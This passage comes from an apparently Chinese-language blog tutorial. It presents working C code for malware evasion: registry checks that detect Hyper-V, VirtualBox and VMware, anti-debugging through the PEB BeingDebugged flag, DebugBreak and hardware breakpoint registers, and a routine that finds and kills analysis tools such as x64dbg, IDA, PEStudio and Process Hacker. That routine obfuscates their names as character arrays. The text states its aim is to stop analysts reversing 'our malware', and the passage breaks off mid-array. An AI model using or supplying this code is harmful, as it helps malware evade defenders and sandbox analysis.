class="line">        Result = RegQueryValueExA(hkey, <span class="string">&quot;VirtualMachineName&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, data, &amp;dataSize);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] 虚拟机名称: %s\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">char</span>*)data);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 查询主机名</span></span><br><span class="line">        Result = RegQueryValueExA(hkey, <span class="string">&quot;HostName&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, data2, &amp;dataSize);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] 主机名: %s\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">char</span>*)data2);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 查询物理宿主机的完全限定名称</span></span><br><span class="line">        Result = RegGetValueA(hkey, <span class="literal">NULL</span>, <span class="string">&quot;PhysicalHostNameFullyQualified&quot;</span>, RRF_RT_REG_SZ, &amp;dwType, data2, &amp;dataSize);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] 物理宿主机名字: %s\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">char</span>*)data2);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 关闭注册表项句柄</span></span><br><span class="line">        RegCloseKey(hkey);</span><br><span class="line">        <span class="comment">// 返回 TRUE 表示检测到虚拟化软件</span></span><br><span class="line">        <span class="keyword">return</span> TRUE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查是否在 VirtualBox 中运行</span></span><br><span class="line">    Result = RegOpenKeyExA(HKEY_LOCAL_MACHINE, <span class="string">&quot;HARDWARE\\ACPI\\DSDT\\VBOX__&quot;</span>, <span class="number">0</span>, KEY_READ | KEY_WOW64_64KEY, &amp;hkey);</span><br><span class="line">    <span class="keyword">if</span> (Result == ERROR_SUCCESS) &#123;</span><br><span class="line">        <span class="comment">// 如果能够成功打开注册表项，表示在 VirtualBox 中运行</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] 当前运行在 VirtualBox 虚拟机中\n&quot;</span>);</span><br><span class="line">        RegCloseKey(hkey);</span><br><span class="line">        <span class="keyword">return</span> TRUE;</span><br><span class="line">    &#125;</span><br><span class="line">    RegCloseKey(hkey);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查是否在 VMware 中运行</span></span><br><span class="line">    Result = RegOpenKeyExA(HKEY_LOCAL_MACHINE, <span class="string">&quot;SOFTWARE\\VMware, Inc.\\VMware Tools&quot;</span>, <span class="number">0</span>, KEY_READ | KEY_WOW64_64KEY, &amp;hkey);</span><br><span class="line">    <span class="keyword">if</span> (Result == ERROR_SUCCESS) &#123;</span><br><span class="line">        <span class="comment">// 如果能够成功打开注册表项，表示在 VMware 中运行</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] 当前运行在 VMware 虚拟机中\n&quot;</span>);</span><br><span class="line">        RegCloseKey(hkey);</span><br><span class="line">        <span class="keyword">return</span> TRUE;</span><br><span class="line">    &#125;</span><br><span class="line">    RegCloseKey(hkey);</span><br><span class="line">    <span class="keyword">return</span> FALSE;  <span class="comment">// 如果没有检测到任何虚拟化软件，返回 FALSE</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    CheckHypervisor();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li><p><strong>RegOpenKeyExA</strong>:</p><p><code>RegOpenKeyExA</code> 是 Windows API 中的一个函数，用于打开一个注册表项并获得一个句柄，打开的注册表项可以用来查询或设置值。</p><ul><li><code>HKEY hKey</code>: 要打开的注册表项的根键。</li><li><code>LPCSTR lpSubKey</code>: 要打开的子项的名称。</li><li><code>DWORD ulOptions</code>: 保留，通常为 0。</li><li><code>REGSAM samDesired</code>: 指定所需的访问权限。</li><li><code>PHKEY phkResult</code>: 指向接收打开的注册表项句柄的变量的指针。</li></ul></li><li><p><strong>RegCloseKey</strong>:</p><p><code>RegCloseKey</code> 用于关闭打开的注册表项句柄。</p><ul><li><code>HKEY hKey</code>: 要关闭的注册表项的句柄。</li></ul></li><li><p><strong>RegQueryValueExA</strong>:</p><p><code>RegQueryValueExA</code> 用于检索指定注册表项中的某个值。</p><ul><li><code>HKEY hKey</code>: 包含要检索的值的注册表项的句柄。</li><li><code>LPCSTR lpValueName</code>: 要检索的值的名称。</li><li><code>LPDWORD lpReserved</code>: 保留，必须为 NULL。</li><li><code>LPDWORD lpType</code>: 指向接收值类型的变量的指针。</li><li><code>LPBYTE lpData</code>: 指向接收数据的缓冲区的指针。</li><li><code>LPDWORD lpcbData</code>: 指向接收数据大小的变量的指针。</li></ul></li><li><p><strong>RegGetValueA</strong>:</p><p><code>RegGetValueA</code> 从注册表中检索值。与 <code>RegQueryValueExA</code> 不同，它可以获取嵌套的子项值。</p><ul><li><code>HKEY hKey</code>: 包含要检索值的注册表项的句柄。</li><li><code>LPCSTR lpSubKey</code>: 要打开的子项的名称。</li><li><code>LPCSTR lpValue</code>: 要检索的值的名称。</li><li><code>DWORD dwFlags</code>: 指定如何检索信息。</li><li><code>LPDWORD pdwType</code>: 指向接收值类型的变量的指针。</li><li><code>PVOID pvData</code>: 指向接收数据的缓冲区的指针。</li><li><code>LPDWORD pcbData</code>: 指向接收数据大小的变量的指针。</li></ul></li></ol><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202411071301387.png" data-fancybox="true"/></div></div><h3 id="反调试-1"><a href="#反调试-1" class="headerlink" title="反调试"></a>反调试</h3><p>反调试是阻止恶意软件分析师调试&#x2F;逆向我们的恶意软件的行为.</p><p>反调试技术，即<code>BeingDebugged</code>，但在讨论这个技术之前，需要先了解一下<code>PEB</code>(<code>Process Environment Block</code>:进程环境块).</p><p><code>PEB(Process Environment Block)</code>:</p><ul><li>PEB是Windows操作系统中的一个数据结构，用于存储关于当前进程状态和环境的信息。每个进程在其自身的地址空间中有一个PEB</li><li>PEB包含的信息包括：<ul><li>进程加载的模块（DLL）</li><li>进程参数（例如命令行参数）</li><li>环境变量</li><li>进程的运行时数据</li><li>以及其他关于进程的元数据</li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">PEB</span> &#123;</span></span><br><span class="line">  BYTE Reserved1[<span class="number">2</span>];  <span class="comment">// 保留字段，用于对齐或未来使用</span></span><br><span class="line">  BYTE BeingDebugged;  <span class="comment">// 表示进程是否被调试器调试，0为否，非0为是</span></span><br><span class="line">  BYTE Reserved2[<span class="number">1</span>];  <span class="comment">// 保留字段，用于对齐或未来使用</span></span><br><span class="line">  PVOID Reserved3[<span class="number">2</span>];  <span class="comment">// 保留字段，通常用于指向内部结构或未来扩展</span></span><br><span class="line">  PPEB_LDR_DATA Ldr;  <span class="comment">// 指向加载器数据的指针，包含该进程中加载的模块信息</span></span><br><span class="line">  PRTL_USER_PROCESS_PARAMETERS ProcessParameters;  <span class="comment">// 指向进程参数的指针，包含命令行参数、环境变量等</span></span><br><span class="line">  PVOID Reserved4[<span class="number">3</span>];  <span class="comment">// 保留字段</span></span><br><span class="line">  PVOID AtlThunkSListPtr;  <span class="comment">// 指向线程本地存储的Thunk列表指针</span></span><br><span class="line">  PVOID Reserved5;  <span class="comment">// 保留字段</span></span><br><span class="line">  ULONG Reserved6;  <span class="comment">// 保留字段</span></span><br><span class="line">  PVOID Reserved7;  <span class="comment">// 保留字段</span></span><br><span class="line">  ULONG Reserved8;  <span class="comment">// 保留字段</span></span><br><span class="line">  ULONG AtlThunkSListPtr32;  <span class="comment">// 32位进程的线程本地存储Thunk列表指针</span></span><br><span class="line">  PVOID Reserved9[<span class="number">45</span>];  <span class="comment">// 大量保留字段</span></span><br><span class="line">  BYTE Reserved10[<span class="number">96</span>];  <span class="comment">// 保留字节，用于对齐或未来使用</span></span><br><span class="line">  PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine;  <span class="comment">// 进程初始化后的回调例程</span></span><br><span class="line">  BYTE Reserved11[<span class="number">128</span>];  <span class="comment">// 保留字节</span></span><br><span class="line">  PVOID Reserved12[<span class="number">1</span>];  <span class="comment">// 保留字段</span></span><br><span class="line">  ULONG SessionId;  <span class="comment">// 当前会话的ID，用于区分不同的用户会话</span></span><br><span class="line">&#125; PEB, *PPEB;</span><br></pre></td></tr></table></figure><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202411071301611.png" data-fancybox="true"/></div></div><h4 id="BeingDebugged"><a href="#BeingDebugged" class="headerlink" title="BeingDebugged"></a>BeingDebugged</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span>      <span class="comment">// 标准输入输出库，提供输入输出函数，如 printf 和 scanf</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span>    <span class="comment">// Windows API 头文件，提供大多数 Windows 操作系统功能的访问，如窗口管理和进程控制</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 仅在需要时定义简化版的PEB结构体</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">PEB</span> &#123;</span></span><br><span class="line">    BYTE Reserved1[<span class="number">2</span>];</span><br><span class="line">    BYTE BeingDebugged; <span class="comment">// 检查此标志来确定是否在被调试</span></span><br><span class="line">    BYTE Reserved2[<span class="number">1</span>];</span><br><span class="line">    <span class="comment">// ... 其他成员</span></span><br><span class="line">&#125; PEB, * PPEB;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查当前进程是否在被调试</span></span><br><span class="line">BOOL <span class="title function_">IsDebuggerPresent2</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64   </span></span><br><span class="line">    <span class="comment">// 对于64位程序，从GS段寄存器读取PEB地址</span></span><br><span class="line">    PPEB pPeb = (PEB*)(__readgsqword(<span class="number">0x60</span>)); <span class="comment">// Process Environment Block</span></span><br><span class="line"><span class="meta">#<span class="keyword">elif</span> _WIN32</span></span><br><span class="line">    <span class="comment">// 对于32位程序，从FS段寄存器读取PEB地址</span></span><br><span class="line">    PPEB pPeb = (PEB*)(__readfsdword(<span class="number">0x30</span>));</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="keyword">if</span> (pPeb-&gt;BeingDebugged == <span class="number">1</span>) &#123; <span class="comment">// 如果BeingDebugged标志被设置</span></span><br><span class="line">        <span class="keyword">return</span> TRUE; <span class="comment">// 返回TRUE，表示正在被调试</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> FALSE; <span class="comment">// 返回FALSE，表示没有被调试</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (IsDebuggerPresent2()) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] 正在被调试!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] 没有被调试.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202411071302087.png" data-fancybox="true"/></div></div><h4 id="DebugBreak"><a href="#DebugBreak" class="headerlink" title="DebugBreak"></a>DebugBreak</h4><p><code>DebugBreak()</code>:<code>debugbreak</code>是我们的第二个反调试技术,其中<code>DebugBreak()</code>函数会导致在当前进程中引发断点异常。这允许调用线程用信号通知调试器处理异常。因此，我们依赖于<code>GetExceptionCode()</code>函数的返回，它将告诉我们异常是否由调试器处理.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span>      <span class="comment">// 标准输入输出库，提供输入输出函数，如 printf 和 scanf</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span>    <span class="comment">// Windows API 头文件，提供大多数 Windows 操作系统功能的访问，如窗口管理和进程控制</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 自定义反调试函数</span></span><br><span class="line">BOOL <span class="title function_">CheckDebuggerPresence</span><span class="params">()</span> &#123;</span><br><span class="line">    __try &#123;</span><br><span class="line">        DebugBreak(); <span class="comment">// 触发调试中断异常，这通常会中断到调试器中，如果有调试器附加</span></span><br><span class="line">        <span class="keyword">return</span> TRUE;  <span class="comment">// 如果代码执行到这里，说明异常被调试器处理了，返回TRUE表示正在被调试</span></span><br><span class="line">    &#125;</span><br><span class="line">    __except (GetExceptionCode() == EXCEPTION_BREAKPOINT ? EXCEPTION_EXECUTE_HANDLER : EXCEPTION_CONTINUE_SEARCH) &#123;</span><br><span class="line">        <span class="comment">// 检查异常代码是否是 EXCEPTION_BREAKPOINT。如果是，执行异常处理程序。</span></span><br><span class="line">        <span class="comment">// EXCEPTION_BREAKPOINT 是一个常量，表示断点异常，通过调试器捕获。</span></span><br><span class="line">        </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] 未被调试器处理\n&quot;</span>);  <span class="comment">// 如果异常未被调试器处理，则打印信息并表示没有调试器附加</span></span><br><span class="line">        <span class="keyword">return</span> FALSE;  <span class="comment">// 返回FALSE表示没有调试器在附加</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    CheckDebuggerPresence();  <span class="comment">// 调用自定义反调试函数，检查当前进程是否被调试</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="ContextLogRegisters"><a href="#ContextLogRegisters" class="headerlink" title="ContextLogRegisters"></a>ContextLogRegisters</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span>      <span class="comment">// 标准输入输出库，提供输入输出函数，如 printf 和 scanf。</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span>    <span class="comment">// Windows API 头文件，提供大多数 Windows 操作系统功能的访问，如窗口管理和进程控制。</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查当前线程是否被调试</span></span><br><span class="line">BOOL <span class="title function_">IsThreadBeingDebugged</span><span class="params">()</span> &#123;</span><br><span class="line">    CONTEXT Ctx;  <span class="comment">// 定义一个 CONTEXT 结构体变量，用于保存线程的上下文信息。</span></span><br><span class="line">    Ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;  <span class="comment">// 设置 CONTEXT 标志，只获取调试寄存器的信息。</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 获取当前线程的上下文信息，包括调试寄存器</span></span><br><span class="line">    <span class="keyword">if</span> (!GetThreadContext(GetCurrentThread(), &amp;Ctx)) &#123;</span><br><span class="line">        <span class="comment">// 如果获取失败，打印错误消息并显示错误代码（使用 GetLastError() 获取）</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\t\n [!] 获取线程上下文失败，错误代码：0x%lu \n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;  <span class="comment">// 返回 FALSE，表示操作失败或没有调试器附加。</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 检查调试寄存器 Dr0, Dr1, Dr2, Dr3 是否被设置</span></span><br><span class="line">    <span class="keyword">if</span> (Ctx.Dr0 != <span class="literal">NULL</span> || Ctx.Dr1 != <span class="literal">NULL</span> || Ctx.Dr2 != <span class="literal">NULL</span> || Ctx.Dr3 != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="comment">// 如果有任意一个寄存器不为空，说明有硬件断点被设置</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] 已在以下地址设置硬件断点：\n\t Dr0 地址：0x%llx \n\t Dr1 地址：0x%llx \n\t Dr2 地址：0x%llx \n\t Dr3 地址：0x%llx\n&quot;</span>, Ctx.Dr0, Ctx.Dr1, Ctx.Dr2, Ctx.Dr3);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] 当前线程正在被调试\n&quot;</span>);  <span class="comment">// 打印信息，表示线程正在被调试。</span></span><br><span class="line">        <span class="keyword">return</span> TRUE;  <span class="comment">// 返回 TRUE，表示当前线程正在被调试。</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 否则，表示没有调试器附加或没有设置硬件断点</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] 没有设置硬件断点\n&quot;</span>);  <span class="comment">// 打印信息，表示没有硬件断点。</span></span><br><span class="line">        <span class="keyword">return</span> FALSE;  <span class="comment">// 返回 FALSE，表示没有调试器附加。</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    IsThreadBeingDebugged();  <span class="comment">// 调用函数以检查当前线程是否被调试。</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="终止分析工具"><a href="#终止分析工具" class="headerlink" title="终止分析工具"></a>终止分析工具</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span>      <span class="comment">// 标准输入输出库，提供输入输出函数，如 printf 和 scanf。</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span>    <span class="comment">// Windows API 头文件，提供大多数 Windows 操作系统功能的访问，如窗口管理和进程控制。</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tlhelp32.h&gt;</span>   <span class="comment">// 提供工具帮助函数，允许对系统快照进行操作，如进程和线程枚举。</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 检测并终止特定名称的进程</span></span><br><span class="line">BOOL <span class="title function_">TerminateDebuggingProcess</span><span class="params">(WCHAR* procname)</span> &#123;</span><br><span class="line">    BOOL processTerminated = FALSE;  <span class="comment">// 初始化标志，用于跟踪是否成功终止了任何进程。</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建一个进程快照，用于枚举当前系统中的所有进程。</span></span><br><span class="line">    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (hSnapshot == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[!] 创建进程快照错误: %lu\n&quot;</span>, GetLastError());  <span class="comment">// 输出错误信息。</span></span><br><span class="line">        <span class="keyword">return</span> TRUE;  <span class="comment">// 返回 TRUE 表示未能成功创建快照。</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    PROCESSENTRY32 pe;  <span class="comment">// 定义 PROCESSENTRY32 结构来存储进程信息。</span></span><br><span class="line">    pe.dwSize = <span class="keyword">sizeof</span>(PROCESSENTRY32);  <span class="comment">// 设置结构大小。</span></span><br><span class="line">    BOOL res = Process32First(hSnapshot, &amp;pe);  <span class="comment">// 获取第一个进程的信息。</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (res) &#123;  <span class="comment">// 遍历所有进程。</span></span><br><span class="line">        <span class="keyword">if</span> (!wcscmp(pe.szExeFile, procname)) &#123;  <span class="comment">// 比较进程名称。</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] 找到进程 %ls 正在运行，PID: %u\n&quot;</span>, procname, pe.th32ProcessID);  <span class="comment">// 输出找到的进程信息。</span></span><br><span class="line"></span><br><span class="line">            HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe.th32ProcessID);  <span class="comment">// 尝试打开进程。</span></span><br><span class="line">            <span class="keyword">if</span> (hProcess) &#123;</span><br><span class="line">                <span class="keyword">if</span> (TerminateProcess(hProcess, <span class="number">0</span>)) &#123;  <span class="comment">// 尝试终止进程。</span></span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;\t[+] 成功终止进程 %ls\n&quot;</span>, procname);  <span class="comment">// 输出成功信息。</span></span><br><span class="line">                    processTerminated = TRUE;  <span class="comment">// 更新标志为 TRUE。</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;[!] 终止进程 %ls 失败: %lu\n&quot;</span>, procname, GetLastError());  <span class="comment">// 输出失败信息。</span></span><br><span class="line">                &#125;</span><br><span class="line">                CloseHandle(hProcess);  <span class="comment">// 关闭进程句柄。</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[!] 打开进程 %ls 句柄失败: %lu\n&quot;</span>, procname, GetLastError());  <span class="comment">// 输出打开句柄失败的信息。</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        res = Process32Next(hSnapshot, &amp;pe);  <span class="comment">// 获取下一个进程的信息。</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    CloseHandle(hSnapshot);  <span class="comment">// 关闭快照句柄。</span></span><br><span class="line">    <span class="keyword">return</span> processTerminated;  <span class="comment">// 返回是否成功终止过任何进程。</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 定义一个二维数组，包含需要检测和终止的进程名称。</span></span><br><span class="line">    WCHAR t[][<span class="number">18</span>] = &#123;</span><br><span class="line">        &#123; <span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;g&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;\0&#x27;</span> &#125;, <span class="comment">// x64dbg</span></span><br><span class="line">        &#123; <span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;\0&#x27;</span> &#125;,             <span class="comment">// IDA</span></span><br><span class="line">        &#123; <span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;\0&#x27;</span> &#125;,     <span class="comment">// IDA 64-bit</span></span><br><span class="line">        &#123; <span class="string">&#x27;p&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;\0&#x27;</span> &#125;, <span class="comment">// PEStudio</span></span><br><span class="line">        &#123; <span class="string">&#x27;P&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;H&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;k&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;\0&#x27;</span> &#125;, <span class="comment">// Process Hacker</span></span><br><span class="line">        &#123; <span class="string">&#x27;P&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span 